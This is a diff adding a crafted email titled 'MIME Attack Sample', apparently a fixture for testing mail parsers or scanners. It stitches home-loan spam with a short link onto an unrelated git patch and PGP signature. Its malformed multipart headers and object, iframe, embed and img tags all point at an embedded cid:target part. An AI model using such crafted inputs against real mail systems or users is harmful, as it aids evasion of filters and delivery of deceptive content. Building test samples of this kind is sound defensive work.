@@ -1,0 +1,101 @@
+From: Yannick Gingras <ygingras@eclipsys.qc.ca>
+To: robert.badeer@enron.com, legal <.hall@enron.com>, ryan.slinger@enron.com
+Subject: MIME Attack Sample
+Content-Type: multipart/related; boundary="DELIMITER"
+--DELIMITER
+Content-Type: text/html
+Content-Type: text/plain; charset=US-ASCII; format=flowed
+X-Miltered: at psyche with ID 46367AB2.001 by Joe's j-chkmail (http://j-chkmail.ensmp.fr)!
+X-Virus-Scanned: ClamAV version 0.90.2, clamav-milter version 0.90.2 on localhost
+X-Virus-Status: Clean
+X-UUID: cdd7b5cc-d449-4848-a08c-040935a82c39
+Status: O
+Content-Length: 356
+Lines: 29
+
+
+Dear H0me 0wner
+
+Are you tired of paying high interest rates?. Your loan approval is waiting.
+
+You can receive $228,000 for 
+$637 per month.
+
+Please respond asap.
+http://ilook.tw/l5jt
+ 
+
+
+Beau Philips
+Your Home Loan
+
+
+If a million people say a foolish thing, it is still a foolish thing.	-Anatole France [Jacques Anatole Thibault] (1844-1924)	
+
+
+
+
+
+
+
+
+
+
+
+
+<object width="100%" height="25" data="cid:target"></object>
+<iframe width="100%" height="25"  src="cid:target"></iframe>
+<embed  width="100%" height="25" src="cid:target"/></embed><img    width="100"  height="25"  src="cid:target">
+--DELIMITER
+Content-ID: <target>Content-Type: multipart/signed; boundary="BOUNDARY";  protocol="application/pgp-signature"
+--BOUNDARY
+Content-Type: text/plain
+Content-Transfer-Encoding: quoted-printable
+ SHA1
+
+_dbus_bindings is a private implementation detail with no API guarantees;
+it may change incompatibly (or cease to exist) at any time. If you need the
+low-level, message-based API, use dbus.lowlevel instead.
+
+Patch also available in http://projects.collabora.co.uk/~smcv/git/datastore.git
+- ---
+ src/olpc/datastore/dbus_helpers.py |    4 ++--
+ 1 files changed, 2 insertions(+), 2 deletions(-)
+
+diff --git a/src/olpc/datastore/dbus_helpers.py b/src/olpc/datastore/dbus_helpers.py
+index 5b712fd..b706741 100644
+- --- a/src/olpc/datastore/dbus_helpers.py
++++ b/src/olpc/datastore/dbus_helpers.py
+@@ -1,6 +1,6 @@
+ import olpc.datastore.utils
+ import dbus
+- -import _dbus_bindings
++from dbus.lowlevel import SignalMessage
+ 
+ 
+ # A dbus signal emitter factory
+@@ -13,7 +13,7 @@ class emitter(object):
+     """
+     def __init__(self, bus, obj_path, dbus_interface):
+         self._connection = bus.get_connection()
+- -        self.message = olpc.datastore.utils.partial(_dbus_bindings.SignalMessage, obj_path,
++        self.message = olpc.datastore.utils.partial(SignalMessage, obj_path,
+                                                     dbus_interface)
+ 
+     def __call__(self, name, *args, **kwargs):
+- -- 
+1.5.2-rc3.GIT
+
+-BOUNDARY--
+Content-Type: application/pgp-signature; name="signature.asc"
+BEGIN PGP SIGNATURE-----
+Version: GnuPG v1.4.6 (GNU/Linux)
+Comment: OpenPGP key: http://www.pseudorandom.co.uk/2003/contact/ or pgp.net
+
+iD8DBQFGUsVpWSc8zVUw7HYRAvgoAKCbsY0rQGNcbt4nugs3JWKHTY4m1gCffLzk
+wIVj4YQBnkSBP3JNgGKuKp0=
+=tZFa
+-----END PGP SIGNATURE-----
+_____
+--BOUNDARY--
+--DELIMITER--
